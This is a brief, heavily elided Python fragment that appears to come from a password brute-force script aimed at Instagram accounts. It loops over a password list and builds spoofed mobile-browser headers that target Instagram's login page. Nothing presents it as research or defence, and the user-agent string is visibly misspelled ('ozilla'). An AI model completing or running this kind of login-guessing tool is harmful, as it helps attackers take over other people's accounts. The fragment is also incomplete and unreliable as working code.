        ...
        try:
            for pw in pas:
                ...
                headers = {
					...
					'x-asbd-id': '198387',
					'user-agent': 'ozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
					...
					'referer': 'https://www.secure.instagram.com/accounts/login/?next=/p/CUsy5pkBXDH/&source=post_comment_input&hl=en',
